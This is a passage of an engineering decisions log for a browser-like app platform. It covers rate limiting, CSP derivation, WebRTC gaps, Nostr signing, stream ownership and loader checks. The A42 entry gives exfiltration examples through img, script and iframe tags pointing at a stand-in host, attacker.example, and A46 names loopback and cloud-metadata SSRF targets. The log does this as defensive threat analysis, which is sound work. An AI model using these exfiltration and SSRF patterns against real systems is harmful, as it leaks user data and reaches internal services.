(there is no handle, no grant, and no I/O to scope), so the in-flight cap never engages for
them — each call resolves before the next one could push the count up. Confirmed empirically,
not assumed: 5,000 concurrent `orivon.app.grants()` calls from a single origin, fired through
`handleControlRequest` directly, were answered in full — zero rejected with `'limit'`. Every one
of those calls still runs a dispatch through the broker on the Electron **UI thread** (the same
thread every tab's compositor and input handling shares), so a loop of these from one origin is
T11b by a route the in-flight cap was never built to cover: a freeze of every open tab, not a
resource leak.

**Not fixed in the branch that found it, on purpose.** A rate limit needs real decisions this
document exists to surface rather than guess at: how many calls per second is the bound, whether
it is shared across all six methods or set per method, whether it decays linearly or in discrete
buckets, and whether `fs`/`net` calls — already capped by the in-flight limit — should also count
against it. None of `contracts/`, `handle-contracts.md` or `capability-api.md` specifies any of
this; inventing a set of numbers from inside a fix branch would be exactly the kind of
undocumented, silently-decided architecture Rule 1 exists to prevent.

**AI recommendation, for whoever designs it:** the shape T11b's own wording already implies
(a token bucket: a per-origin budget that refills at a fixed rate and is spent per call,
rejecting once empty rather than queueing, mirroring the in-flight cap's own "reject
immediately" rule) is a reasonable starting point. Where it would live (a new field on
`LIMITS`, a new small module analogous to `port-registry.ts`, and where in `handleControlRequest`
/`dispatch` it would be checked) is not decided here.

**Needed by:** before any app can call `orivon.app.manifest`/`orivon.app.grants` in a loop with
no user action gating it — realistically, whichever build step first ships an app that polls its
own grants (a plausible pattern for anything that wants to react to a revocation live).

### Resolution, 2026-09-02

A shared per-origin token bucket (`src/broker/transport/token-bucket.ts`), checked in
`handleControlRequest` before `dispatch()` runs, gates **all six** control methods uniformly —
never queueing, mirroring the in-flight cap's own "reject immediately" rule. Answers the three
open questions above:

- **Shared across all six methods, not per-method.** Simpler, and automatically covers any
  future seventh method with no more code. `fs`/`net` are already separately bounded by the
  in-flight cap; this is an *additional*, independent bound on call *frequency*.
- **Continuous linear refill, not discrete windows.** Avoids the classic double-burst-at-a-
  boundary failure mode (max out the tail of one window, then immediately max out the head of
  the next).
- **`fs`/`net` calls count against the same shared bucket.** No special-casing.

**The numbers — capacity 200, refill 100/sec per origin — are an AI recommendation, not an
owner decision**, and are stated as such directly beside them in `src/broker/transport/ipc.ts`. No
measured `CONTROL_CHANNEL` dispatch-rate data exists anywhere in the corpus (spike gate 4
measured socket *byte* throughput over the dedicated port, never this channel's call
frequency), so they are sized against the demonstrated attack (5,000 concurrent calls, now cut
to ~200 admitted) and the realistic legitimate case (an app polling `app.grants()` — two orders
of magnitude of headroom below this budget), not against any real `fs`/`net` traffic pattern,
since none has been exercised yet.

**A `net.close` exemption was considered and rejected.** The idea (cleanup paths shouldn't be
blocked by the limit they'd relieve, mirroring `HandleTable.release` never being gated by the
in-flight cap) does not transfer: `net.close` needs no grant at all, so exempting it would
reopen the exact vulnerability this entry describes through a different, permanently-open
method. Releasing 512 sockets at 100/sec costs ~5 seconds — a trivial price next to leaving a
method with no bound.

**New, unresolved risk, named rather than solved:** once `fs`/`net` dispatch sees real traffic
(build step 3+), a legitimate burst of small file reads or socket connects could consume most of
an origin's shared budget and cause an *unrelated* `app.grants()` poll to be denied `'limit'`,
even though that poll alone was well within any sane rate. Revisit once real webtorrent I/O
drives this path end-to-end — either a second, separate bucket for I/O-bound methods, or a
documented decision that the trade-off is acceptable.

### A39 — `index.ts` keeps a private, stricter `isOrivonError` than `errors.ts`'s **[AI-REC]**

Found 2026-09-02 while consolidating a third duplicate in the same file pair (`errnoOf`, now in
`errors.ts` and imported by both call sites).

[`errors.ts`](../src/broker/errors.ts)'s `isOrivonErrorLike` requires `instanceof Error` plus a
`code` in the enum. [`index.ts`](../src/broker/index.ts)'s private `isOrivonError` requires all
of that **and** `.name === 'OrivonError'`. They therefore disagree about one real case: an error
an adapter constructed with a valid `code` but a different `name` is broker-produced to
`errors.ts` and raw-from-a-dependency to `index.ts`. `index.ts` also keeps its own copy of the
11-value `ORIVON_ERROR_CODES` set that `errors.ts` already exports.

`errors.ts`'s own doc comment has flagged this since it was written — deliberately deferred
under "fixed where touched, not chased", not missed. It is recorded here because that note
lived only in a code comment, where nothing tracks it, and because the `errnoOf` duplicate that
prompted this entry shows the pattern reproducing in the same two files.

**AI recommendation:** export `ORIVON_ERROR_CODES` from `errors.ts`, then decide which name
check is correct rather than merging them blind — `.name` is set by `BrokerError`'s constructor,
so the stricter test is the one that actually means "this broker built it", and the looser one
may be the defect. That is a behavioural decision, which is why this was not folded into the
`errnoOf` change.

**Needed by:** before anything else starts classifying thrown values. Not blocking.

### A40 — Rule 1 has a mechanically checkable failure mode, and enforcement is deferred **[AI-REC]**

Found 2026-09-02, auditing the five byte-pump commits against `code-guidelines.md`.

Three comments narrated the change rather than the code — two "a sibling commit ...", one
"`HandleTable.fail` already existed ... nothing had ever wired a caller up to it". They passed
Rule 1's stated test (none restates the line beneath it) and the files' comment density was in
line with `derive.ts`'s 67%, which a prior audit reviewed and accepted. They fail the rule's
*purpose*: after merge, "the sibling commit" names nothing a reader can resolve.

**This is not new drift, which is the more useful finding, and the first count of it was wrong.**
Widening the search from "sibling commit" to "this PR"/"this task"/"the PR body" turns up
**nineteen** instances across four streams (`broker/`, `loader/`, `preload/`, `shim/`) and many
separate commits. The dominant idiom is "see the PR body" — five instances, each pointing a
future reader at a document that is not reachable from the tree, and one of them at "this PR's
body under 'Decisions and open questions'" specifically. A second family ("OUT OF SCOPE for this
task", "files this task may not touch") encodes a *branch-local constraint* as if it were a
property of the code, and becomes false the moment the constraint lifts — `grant-ledger.ts`'s
had already gone stale that way.

So the five commits that prompted this entry did not introduce the habit; they inherited it.
Eight are fixed here (the three above, plus four in `broker/` and `errors.ts`'s own). Eleven
remain, seven of them in `broker/` and four in paths this stream does not own.

**Not swept in one pass, deliberately.** A nineteen-comment rewrite spanning four streams is
exactly the cross-stream edit `parallel-work.md` says to raise rather than make, and the repo's
own "fixed where touched, not chased" principle applies. The hook below warns on edit, so the
remainder get fixed as their files are next opened.

Two things follow, and they pull in opposite directions:

- Rule 1's worked example only covers restating-the-code, so an audit applying the rule as
  written passes this class. The rule's §Where a long comment is right could name it: **a
  comment describes the code as it stands, not the change that produced it.** Git history holds
  the change.
- Unlike the rest of Rule 1, this specific class *is* greppable — it has a lexical signature
  ("sibling commit", "this PR", "already existed", "previously"). code-guidelines.md §Status records the
  owner's decision that nothing enforces these rules mechanically, **rules first, enforcement
  later**, so adding a `check:comments` guard would reverse a standing decision and is not done
  here.

**AI recommendation:** add the sentence to Rule 1 now (documentation, not enforcement, so it
does not touch §Status), and add a `hookify` warn-only rule, which `CLAUDE.md` already
sanctions as the mechanism for "whenever the owner corrects the same thing twice" and which is
advisory rather than a build gate. Hold `check:comments` until §Status is revisited.

> **Correction, 2026-09-03 (owner's decision).** `check:comments` was built and wired into CI
> the same day this correction is written — `scripts/check-comments.mjs`, on
> `stream/backlog-08-comment-budget` (PR #55). This entry's "not done here" and "hold until
> revisited" are superseded; the deferral this entry describes expired for the reason it names:
> the rule was being followed and the codebase drifted anyway. See `code-guidelines.md` §Status
> for the reversal in full — it also corrects a claim §Status itself used to carry, that Rule 1
> "is not mechanically checkable by anything, and never will be." Comment *quality* still is not;
> a comment *budget* is, and that is the distinction the guard rests on.

**Needed by:** whenever the next batch of commits is written by an agent. Not blocking.

### A41 — WebRTC blocking has no mechanism specified anywhere **[RESEARCH]**

Found 2026-09-02 writing T22's CSP `connect-src` derivation
(`src/broker/policy/connect-src.ts`). ADR-0006 requires that an app without a network capability
be unable to reach the network at all, and WebRTC is a hole in that: a plain `RTCPeerConnection`
can open a data channel or hit a STUN/TURN server without ever calling `orivon.net.connect`, and
without going through `fetch`/`WebSocket` either — so nothing this build step touches bounds it.

No mechanism is specified anywhere in the corpus. There is no `webrtc-src` in real CSP (the
directive does not exist); nothing in this tree or the vision corpus references
`setPermissionRequestHandler` or a Blink feature-disabling precedent for it.

**This is not purely a missing-mechanism problem.** The flagship's own spike evidence
(`week-0-spike-plan.md`) deliberately leaves WebRTC unaliased so webtorrent uses Chromium's
native implementation — blocking WebRTC outright for a capability-less app would also break the
flagship's own use of it, unless blocking is scoped to "no network capability granted" in a way
nothing here yet defines. "Block WebRTC" has an unrecorded product cost, not just an unbuilt
mechanism.

**Needed by:** build step 6, before the trust indicator's C-ladder claims are shown to a user —
a claim of "no network access" is false today for any app that tries WebRTC. Not blocking this
PR.

### A42 — what the injected CSP does not bound **[PARTIALLY RESOLVED 2026-09-13]**

Found 2026-09-02, same file as A41. Stated in `connect-src.ts`'s own header, recorded here so it
is reachable outside a code comment (A40's own lesson).

T22's `connect-src` bounds `fetch` and WebSocket only. `img-src`, `form-action`, navigation
(`<a href>`, `location.href`), and `<link rel=prefetch>` are separate CSP directives this PR does
not set, and an app can use any of them to exfiltrate data to a host `orivon.net.connect` would
have refused — an `<img src="http://attacker.example/?d=...">` needs no capability at all under
today's policy. ADR-0006's "the manifest genuinely bounds network reach" overstates this for
anything beyond `fetch`/WebSocket.

**Two more channels, found on review 2026-09-02, worse than the ones above.** `script-src` is
also unset: `<script src="https://attacker.example/?d=...">` both exfiltrates AND executes
arbitrary code at the app's own origin — data theft and code execution from one unset directive.
`frame-src` is unset too: an app can embed `<iframe src="https://attacker.example/relay.html">`,
whose own `'self'` is the attacker's origin (not the app's), and `postMessage` data into it —
CSP on the app's document has no say over what the framed origin does with what it receives.

Separately, and more fundamentally: CSP bounds **names**, `checkConnect` bounds **resolved
addresses**. For a hostname pattern the two diverge exactly on DNS rebinding (T12) — a name CSP
grants reach to can still resolve privately, reachable by `fetch` though not by
`orivon.net.connect`. No CSP construction closes that; it is Chromium's Private Network Access
problem, not this function's.

**Needed by:** before the trust indicator (build step 6) or `security-model.md` state either gap
as closed. Not blocking this PR — recorded so the honest scope of T22 survives past the file
header that currently carries it alone.

**Partially resolved 2026-09-13, lane S4-6-csp:** the header S4-6 actually wires
(`src/loader/serve.ts`'s `cspHeaderValue`) adds `default-src 'self'` and an explicit `script-src
'self' 'unsafe-inline'` alongside the `connect-src` this entry originally described alone. That
closes `img-src`, `form-action` and `frame-src` (all three fall back to `default-src`, unset) and
`script-src` (now explicit) — the exfiltration-via-`<img>`/`<iframe>`/`<script>` paths this entry
names above. **Still open, unchanged by this fix:** top-level navigation (`<a href>`,
`location.href` — CSP's `default-src` never governs it) and the DNS-rebinding paragraph below
(CSP names, `checkConnect` addresses) — neither is a gap this fix could have closed; see
`src/broker/policy/README.md`'s `connect-src.ts` note for the fuller accounting.

### A43 — a grant CSP cannot represent is omitted, which means BLOCKED, not merely uncovered **[OWNER DECISION]**

Found on review 2026-09-02, same file as A41/A42. CSP's `connect-src` allowlist has no way to
express "any public unicast address" (what a bare `*` pattern means, `security-model.md` T12) or
a port range wider than `connect-src.ts`'s `MAX_ENUMERATED_PORTS` (16) — CSP has no range syntax,
only an enumerable source list. `connectSrcFor` omits both rather than approximating them.

**The consequence is larger than the file's own framing first suggested.** The emitted
`connect-src` value is the app's ENTIRE allowlist for ordinary `fetch`/WebSocket calls — an
omitted pattern is not "uncovered by CSP", it is unreachable. The flagship torrent app genuinely
holds `tcp.connect: ["*:*"]` (`capability-api.md`), which has no CSP equivalent at all. Once
build step 4 wires `onHeadersReceived`, that app's `connect-src` becomes `'self'` and nothing
else — every ordinary `fetch`/WebSocket call the app's own page might make (an update check, a
tracker announce over HTTP rather than the broker) fails, even though the broker itself would
allow it via `orivon.net.connect`. The torrent transfers themselves are unaffected — those go
through the broker, not through page-level `fetch`.

**Owner decision, 2026-09-02: keep the lock shut tight.** Three options were on the table —
(1) keep omitting, accept the app-side breakage as the cost of never widening CSP past what the
user actually granted; (2) translate `*` to CSP's bare `*`, which works but also opens the app's
page to the user's own loopback and LAN, exactly what a `*` grant explicitly excludes
(`connect-patterns.ts`'s own `hostMatches`); (3) have `connectSrcFor` signal "this grant cannot
be bounded by CSP" and have build step 4 skip setting the header for that origin entirely, which
is reach-equivalent to (2) but never states a false claim in the header itself. The owner chose
(1): CSP stays as strict as it can honestly be, `omitted` reports every unrepresentable pattern
with an accurate reason (`host-any-public-unicast`, `port-range-too-wide`) so a later trust
screen can explain a broken feature instead of leaving it silent, and no widening path is left
for a future change to take by accident.

**Needed by:** build step 4 (the header actually gets applied) and build step 6 (the trust
screen needs `ConnectSrcPolicy.omitted` to explain the breakage). Not blocking this PR — the
derivation is correct as specified; this records the decision and its cost for whoever wires it.

### A44 — secp256k1 point derivation and BIP-340 Schnorr signing exist nowhere, and two sources disagree on which layer should build them **[RESEARCH]**

Found 2026-09-03, building `src/nostr/`'s `window.nostr` (NIP-07) surface (build step 7,
`nostr-01-nip07`).

Confirmed, not assumed: `grep -rln "secp256k1" --include="*.ts" src/` finds the string only in
`derive.ts`/`derive-p256.ts` (as a `DeriveCurve` member and an explicit rejection) and in this
lane's own `nip07.ts` (a comment). No file anywhere in the tree performs secp256k1 scalar
multiplication or produces a BIP-340 Schnorr signature. `derive-p256.ts`'s own `derivePublicKey`
throws `'internal'` for any curve other than `'P-256'`, with the message *"no public-key
derivation for `${curve}` in the policy layer; derive the point from `derivePrivateScalar()` one
layer up (`src/nostr/`)"*.

**Two sources disagree about where the fix belongs.** This lane's brief says the gap "belongs
under `src/broker/policy/`, and not something to hand-roll under time pressure" — consistent with
where P-256's point derivation already lives. But `derive-p256.ts`'s own doc comment (owner
decision, 2026-08-27, citing `ADR-0010 §Rejected`) says the opposite: WebCrypto cannot do
secp256k1 point multiplication or BIP-340 Schnorr signing at all, so once a pure-JS curve library
is needed for the signature, deriving the point with that same library costs nothing extra — and
names `src/nostr/` by path as where that should happen.

**Taken literally, that would require `src/nostr/` to call `derivePrivateScalar()`** — exported
from `derive.ts` — **directly, which conflicts with `src/nostr/README.md`'s own boundary** ("What
it must never import: `src/broker/` internals"), a rule this lane was explicitly told to hold
(brief's Out-of-bounds section). It would also mean the raw derived PRIVATE SCALAR leaving the
broker for wherever `src/nostr/`'s code actually executes (preload or renderer-adjacent, since it
constructs `window.nostr` for an untrusted page) — which reads as a direct conflict with
`capability-api.ts`'s own rule that "the seed is never exposed and raw key export is not a
capability at any tier." Not resolved here: it needs the owner, or whoever wrote
`derive-p256.ts`'s comment, to say what "one layer up (`src/nostr/`)" actually meant — a new
broker-internal module conceptually adjacent to Nostr, or literally this directory.

**What the interface needs to look like, so whichever lane builds this does not have to redesign
`src/nostr/`'s side:** `nip07.ts` exports `NostrSigner = (event: UnsignedNostrEvent, hint:
SignPrompt) => Promise<SignedNostrEvent>` and `orivonIdentitySigner(orivon): NostrSigner`, the
latter forwarding straight to `IdentityHandle.signEvent(event)` (after `orivon.id.requestIdentity(
{ kind: 'nostr' })`). Whatever implements the real signature only needs to make
`IdentityHandle.signEvent` — already in `src/contracts/handles.ts`, unchanged by this lane —
actually: (1) independently recompute the NIP-01 id from the event's own fields rather than trust
anything the caller supplies (`nip01.ts`'s `computeEventId` is a tested, frozen-vector reference
implementation of exactly that serialization, safe to port or diff against); (2) derive the
secp256k1 scalar for `('identity', identityId)` and its x-only public key; (3) produce a 64-byte
BIP-340 Schnorr signature over the id; (4) return `{...event, id, pubkey, sig}`. Nothing in this
lane's code assumes which layer does (2)-(3), or whether `IdentityHandle.signEvent` re-derives
`screenEvent`'s table (`kind-screening.ts`) independently rather than trusting this module's
`hint` parameter — it must, per that file's own header.

**Secondary, resolved rather than escalated:** I considered whether `OrivonId.requestIdentity`'s
or `IdentityHandle.signEvent`'s existing signatures can carry what a Nostr signer needs (the
brief flagged this as a real candidate to stop on). I concluded they do: `signEvent(event:
object)` already receives the whole structured event including `kind`, so a broker-side
implementation can derive its own screening decision without any `src/contracts/` change. Not
filed as a separate blocking question; recorded here and in the PR body as an AI recommendation
in case the owner disagrees.

**Needed by:** before `orivon.id`'s `'secp256k1'` curve can back a real Nostr identity — nothing
in `src/nostr/` can sign a real event until this exists. Not blocking this PR: this lane's whole
surface is built and tested against an injected stub per the owner's explicit decision (brief's
Scope, item 6).

**Corroborated 2026-09-10** (lane P2-5, PR #112, open at filing time — "Wire
`orivon.id.publicKey/sign` to the broker, IPC and the page"): that PR wires the **app-keys**
half of `orivon.id` end to end (`id-capability.ts`, real broker/IPC/preload callers of
`derive-p256.ts`'s `derivePublicKey`/`signWithP256`) but its own commit message is explicit that
`requestIdentity` — the **named-identity** half `nip07.ts`'s real signer actually needs — is
"deliberately untouched," pending the connect-prompt UI. So this entry's gap is exactly as open
as before: still zero secp256k1/Schnorr math anywhere, and still no caller for it, because the
one piece of `orivon.id` this PR completes is not the piece Nostr signing depends on. Recorded
so a future reader does not mistake #112 for progress on this specific question.

### A47 — `registry.ts` is shell-owned and "maintenance only"; this branch edited it anyway **[STILL OPEN]**

Found 2026-09-03, fixing `stream/broker-15-reachable`'s `publishBroker` overwrite gap.

`parallel-work.md`'s ownership map gives `src/main/` to the `shell` stream, and
`src/main/README.md` says so explicitly for `registry.ts` itself: "Maintenance only; other
streams add themselves via `subsystems.ts` rather than editing here." This branch adds
`publishBroker` to `registry.ts` from outside the shell stream, and the sanctioned append point
— `subsystems.ts` — is untouched, because what this branch needed was a second write path onto
`SubsystemContext`, not a new list entry.

The change itself is additive (a new exported function, a doc-comment rewrite) and low-risk, and
the PR discloses the crossing. What makes it worth recording rather than waving through is that
it is **precedent-setting, not one-off**: `src/shim/`, `src/trust/` and `src/nostr/` will each
need to read the same `ctx.broker` this branch just made safely writable, and today the only
pattern available to any of them is "edit `registry.ts` too" — there is no second legal way in.

Two shapes an answer could take:

1. **A second sanctioned append point inside `registry.ts` itself**, alongside `subsystems.ts`'s
   existing one. `parallel-work.md` would name a class of change to `registry.ts` — a new
   optional `SubsystemContext` field plus its own `publishX`-shaped guarded setter, following
   the pattern this branch just established — as an APPEND other streams may make directly,
   distinct from an EDIT to `runBeforeReady`/`runAfterReady` themselves, which stays shell-owned.
   This gives the pattern a name and a place to find it without cross-referencing an unrelated
   entry, and lets `parallel-work.md` state up front what "additive" is allowed to mean here,
   before three streams each guess differently.
2. **Fold this into A31.** A31 already asks whether a non-`backlog-NN` stream branch may edit a
   `docs`-owned file it must keep in step with its own signature change, and proposes extending
   the borrow carve-out on a case-by-case, name-it-in-the-PR-body basis. This is the same shape
   one level down: a stream branch needing to touch a **code** file it does not own, to extend a
   primitive (`ctx.broker`) that the branch itself did not invent but must interoperate with.
   Answering A31 for code as well as docs would resolve both with one decision rather than two.

**Leaning, not a decision:** (2) costs less right now — it reuses a carve-out the owner may
already be inclined to grant rather than asking for a new mechanism to be designed. (1) costs
more up front but scopes the boundary precisely, which matters more here than it does for docs:
a docs edit that goes stale is a wrong sentence, but three streams independently deciding what
counts as an "additive" edit to a shared context object is exactly the kind of drift
`registry.ts`'s own header says the subsystem-registry pattern exists to prevent. Whichever
shape, this should be settled before `shim/`, `trust/` or `nostr/` each hit the same wall and
pick their own answer.

**Needed by:** before the next stream needs to read `ctx.broker` — plausibly `src/shim/` or
`src/trust/`, whichever build step reaches a real grant path first. Not blocking this PR.

### A48 — the credit-window backpressure design is half-built; the constant for the other half is dead code **[RESOLVED 2026-09-06]**

Found 2026-09-03, correcting `handle-contracts.md`'s status header (`docs-18-handle-contracts-
scope`).

Confirmed, not assumed: `grep -rn "CREDIT_COALESCE_BYTES" --include="*.ts"` across `src/` and
`test/` finds exactly two hits — the constant's own definition (`src/contracts/ipc.ts:103`) and
its re-export (`src/contracts/index.ts:66`). A re-export statement is technically an import of the
binding, so "never imported" overstates it; the precise claim is: defined once and re-exported
once, and no file anywhere in `src/` or `test/` actually reads or consumes the value.

`handle-contracts.md`'s "Backpressure — a credit window" section specifies two halves: the broker
stops reading the underlying OS socket once outstanding credit reaches zero, and the renderer
coalesces its own credit acknowledgements ("at most one credit message per 64 KiB consumed, or
once per animation frame") so a fast stream does not emit a broker message per chunk. The first
half is real and tested — `src/broker/transport/port-pump.ts`'s `pumpLoop` loops `while (!stopped && credit
> 0)`, exercised by `port-pump.test.ts` and `port-pump-real-socket.test.ts`. The second half does
not exist anywhere: nothing on the renderer/preload side sends a `CreditMessage` at all yet
(`net.connect` itself is not wired past the broker/main-process IPC layer — see `capability-
api.md`'s corrected status header, same PR), so `CREDIT_COALESCE_BYTES` has no caller and is
exported dead code today.

**Two readings, not resolved here:**
1. The renderer half is still intended, and simply has not been reached — its own build step
   (wiring `net.connect` into `window.orivon` and the page-facing byte stream) comes after this
   one. Under this reading `CREDIT_COALESCE_BYTES` is a forward-declared constant for code that
   does not exist yet, which is ordinary sequencing, not a defect.
2. The design changed since this constant was written, and coalescing on the renderer side is no
   longer how credit acknowledgement will work — in which case the constant is dead code that
   should be removed and `handle-contracts.md`'s Backpressure section amended to match whatever
   replaced it.

**Leaning, not a decision:** reading 1 is the more likely one — nothing else in the corpus
suggests the coalescing design was reconsidered, and `src/broker/index.ts`'s own header lists
wiring the broker to the shell's IPC layer as still open, which the renderer-side byte path
depends on. But this is this lane's read, not a verified fact, and the owner may know otherwise.

**Needed by:** whichever build step wires `net.connect` into `window.orivon` and the renderer's
`ReadableStream` — it needs to know whether to implement the coalescing half or whether
`CREDIT_COALESCE_BYTES` should be deleted first. Not blocking this PR, which is docs-only.


> **Resolved 2026-09-06.** Reading 1 was correct: the renderer half was still intended and had
> simply not been reached. Both halves now exist and are tested.
>
> - Broker read side: `src/broker/transport/port-pump.ts`'s `pumpLoop` stops at credit zero (already true
>   when this was filed).
> - **Renderer read side: `src/preload/socket-port.ts`'s `reportConsumed` flushes a
>   `CreditMessage` once `CREDIT_COALESCE_BYTES` has been consumed, and otherwise coalesces on a
>   macrotask** -- deliberately `setTimeout`, NOT `requestAnimationFrame` as
>   `handle-contracts.md` originally suggested, because rAF does not fire in a backgrounded tab
>   and a torrent downloading in a background tab is the ordinary case here, not an edge one.
>   That is a real (small) departure from the spec text, made knowingly and recorded in the
>   source next to the line.
> - Broker write side: `src/broker/transport/port-sink.ts` coalesces `WriteAckMessage` against the same
>   constant.
>
> `CREDIT_COALESCE_BYTES` therefore has three real consumers and is no longer dead code.
> `handle-contracts.md` §Backpressure's "still not wired up on the renderer/preload side"
> status block is corrected in the same PR as this entry.

### A50 — nothing keeps `handle-contracts.md`'s and `capability-api.md`'s file:line claims honest automatically **[STILL OPEN]**

Found 2026-09-03, during an adversarial review of `docs-18-handle-contracts-scope` (this PR)
against its own claims.

The review caught two defects in this PR's own text: A48 first claimed a grep found "exactly
three hits" for `CREDIT_COALESCE_BYTES` when the real count is two, and
`handle-contracts.md`'s backpressure section said the constant was "never imported anywhere,"
which is literally false — `src/contracts/index.ts:66` re-exports it, and a re-export is an
import. A second pass over the same PR found the identical pattern in the §IdentityHandle
section and `capability-api.md`'s status header: both said "no `orivon.id`... anywhere in
`src/broker/`," overlooking that `src/broker/policy/derive.ts` and `derive-p256.ts` already
implement and test the P-256 half of the key math those methods would need. Both documents
were corrected in this PR.

This is the same failure mode PR #46's blanket "IMPLEMENTED" status went stale by, one PR
earlier: a `file:line` or function-name claim is accurate only for as long as someone remembers
to re-grep it by hand. Nothing in this repository mechanically ties either document's claims to
the code they describe — no test, no CI check, no lint rule fails when a cited function is
renamed, moved, or gains a new caller. Both documents now carry a one-line disclaimer next to
their status header saying the claims are hand-verified as of a given date and can go stale
silently, but a disclaimer is not a fix — it only tells the reader to distrust the document
appropriately, which is not the same as the document staying true.

**Not resolved here, and deliberately not proposed here** — filing this is surfacing the
pattern, not designing the answer: whether anything should mechanically check these claims (a
script that greps every cited `file:line`/function name and fails CI if one no longer resolves
would catch a moved or renamed symbol, though not a claim that was wrong about *behavior* rather
than existence), whether the review cadence that caught this twice should simply run more often
so staleness is caught before it compounds, or whether the cost of either is not worth paying for
two documents this actively maintained. All three are live options; none is a recommendation.

**Needed by:** whoever next revises `handle-contracts.md` or `capability-api.md` substantively —
worth deciding before a third round of this finds a third instance of the same overstatement.
Not blocking this PR, which is docs-only.

---

### A45 — nothing enumerates an app's asset set; the manifest cannot **[RESOLVED 2026-09-03]**

Found 2026-09-03 building `src/loader/` (`stream/loader-02-fetch-cache`, build step 4). The
lane's own brief describes the asset-fetch step as "given a validated manifest, fetch every
asset it declares" — but `Manifest` (`src/contracts/manifest.ts`) declares no such thing. Its
fields are `orivonApiVersion`, `id`, `name`, `version`, `entry`, `capabilities`. `entry` names
one file (the HTML entry point); nothing names the rest of the frontend.

This is not a gap this lane can fix by reading harder. `docs/architecture/bundle-hash.md` and
`ADR-0009` both start from "the leaf set" as a given — they specify how to hash a set of
(path, bytes) pairs once you have one, never how you get one. `app-compatibility.md` says
tier-1 apps (existing Nostr web clients) are pinned "as-is", which for any real built SPA is
dozens of JS/CSS/asset files — so the answer cannot be "just `entry`" either; a bundle hash
covering only `index.html` would not be this app's actual content identity.

**Two shapes an answer could take, neither chosen here:**

1. **A manifest field.** `Manifest` gains an `assets`/`files` list the publisher declares
   explicitly (alongside `entry`). Simple, matches `capabilities`' own already-declarative
   style, and keeps the loader's job purely mechanical — but it is a `src/contracts/` change,
   which is change-controlled (its own PR, merged first, never mixed with an implementation),
   and it puts a burden on every publisher to keep the list in sync with what they actually
   ship.
2. **A crawl heuristic.** The loader fetches `entry`, parses it for referenced same-origin
   assets (`<script src>`, `<link href>`, `<img src>`, recursively into fetched CSS/JS), and
   builds the set from what it finds. No contracts change, matches how a browser's own "save
   page" already behaves — but it is a genuine content-parsing surface over adversarial input,
   it cannot see assets referenced only at runtime (a dynamic `import()`, a service-worker
   `fetch()`), and whichever heuristic is chosen becomes load-bearing the moment the first real
   pin is written: two implementations of "what counts as this app's content" that disagree
   would disagree about the app's own identity, the same one-way-door class of problem
   `ADR-0009` already had to solve once for the hash construction itself.

**What this lane did instead, so the rest of the pipeline could still be built and tested for
real:** `createLoader.load(hintedUrl, assetPaths, context)` takes the discovered asset path
list as an explicit parameter. Everything downstream of "here is the set of asset URLs" —
fetching under the byte caps, building `BundleEntry[]`, calling `bundleTree()`, checking the
`Manifest.entry` leaf exists, driving `decideUpdate()` against the granted pattern set, and
persisting through `LoaderStorage` — is real and tested. Discovering the set itself is left to
whichever caller wires the loader to the shell.

**AI recommendation:** option 1 (a manifest field) is narrower, cheaper, and testable the same
way `capabilities` already is, at the cost of one more thing a publisher must maintain by hand;
option 2 is more convenient for publishers but is a heuristic with real edge cases baked into a
bundle hash that cannot be changed once the first pin exists. Leaning towards 1, but this is
exactly the kind of load-bearing, only-reversible-at-cost choice `CLAUDE.md` Rule 1 reserves for
an ADR, not an AI default.

**Needed by:** whoever wires `createLoader` to the shell's discovery trigger (the remainder of
build step 4) — not blocking this PR, which implements everything downstream of the asset list
and is fully testable against an injected one.

**Resolved 2026-09-03, owner decision, `ADR-0011`.** Option 1 (a manifest field): `Manifest`
gains `assets: readonly string[]`, alongside `entry` — see the ADR for the full reasoning,
including why the "publisher must keep it in sync" cost is deliberately not compensated for in
this field's design: an app that loads more than it declared is the trust/Web3-Score system's
concern (`ADR-0006`), not something the manifest format tries to predict. `src/loader/manifest.ts`
validates it the same way `entry` is validated (`stream/contracts-11-manifest-assets`).
`createLoader.load()`'s own `assetPaths` parameter is unchanged by this — a caller now reads it
off `manifest.assets` rather than inventing or discovering it.

**Corrected 2026-09-04.** The line above assumed a caller would already hold a parsed manifest
before calling `load()` — impossible, since only `fetchBundle` (inside `load()`) ever fetches the
fixed well-known manifest path; nothing upstream has `manifest.assets` to read. Fixed in
`stream/loader-06-assets-from-manifest`: `assetPaths` is removed from both `fetchBundle` and
`Loader.load()`; `fetchBundle` now derives it itself, internally, once it has fetched and parsed
the manifest. See `ADR-0011`'s own 2026-09-04 amendment and `src/loader/README.md`'s Design notes
for the full account.

---

### A46 — the loader never checks the install origin against private/loopback address ranges (T12) **[RESOLVED 2026-09-03]**

Found 2026-09-03 reviewing `stream/loader-02-fetch-cache` (build step 4). `fetch-bundle.ts`
resolves `hintedUrl` through `originFromUrl` (`src/broker/policy/origin.ts`), which validates
scheme and hostname syntax and nothing else — it never checks what address class the hostname
resolves to, and never calls `isPublicUnicast`/`classifyAddress` from
`src/broker/policy/address.ts`.

`address.ts` already exists to answer exactly this question, and its own header states the
discipline required to use it correctly: *resolve once, validate every returned address, then
connect to the IP literal that was validated* — because a hostname is not an address, and a
low-TTL DNS answer can change between a check and a connect. `src/broker/policy/connect.ts`
already follows this discipline for outbound `tcp.connect`. The loader's install path does not
follow it at all: nothing in `fetch-bundle.ts` or `origin.ts` resolves the install origin's
hostname before treating it as fetchable.

**Concretely:** `http://127.0.0.1:9222/.well-known/orivon.json`, `http://169.254.169.254/`
(the cloud metadata endpoint), or a low-TTL host that DNS-rebinds to either between two
requests, all pass every check the loader runs today. Unlike an app's own declared
`tcp.connect` capability, this request needs no grant and no manifest — it is the shell itself,
which has a full, unsandboxed network position, issuing the very first request that discovers
whether an origin is an Orivon app at all.

**Not live today.** `src/loader/subsystem.ts`'s `loaderSubsystem` ships with no `beforeReady`/
`afterReady` — nothing wires a real trigger to `createLoader.load()` yet, so nothing calls this
against a real, attacker-influenced `hintedUrl` in the shipped product. This is why it is filed
rather than blocking.

**Corrected 2026-09-03:** this entry previously named two eventual triggers, "a `<link
rel="orivon-manifest">` hint, or 'Open as app'". The "Open as app" menu action never had an
implementation and has been cut for good (`capability-api.md`'s 2026-09-03 correction block,
`ADR-0012`) — the HTML hint is now the *only* discovery path this loader will ever be wired to.
The substance of this entry (the loader's install path does not resolve-and-classify the install
origin's hostname before treating it as fetchable, T12) is unaffected either way.

**Leaning, not decided:** the loader should mirror `connect.ts`'s own T12 discipline —
resolve the install origin's hostname once, reject if any resolved address is not
`isPublicUnicast`, and only then treat the origin as installable. This is an AI leaning, not an
owner decision: it has not been weighed against, for instance, an explicit allowlist for local
development origins, which a resolve-and-classify check alone would foreclose without a
carve-out.

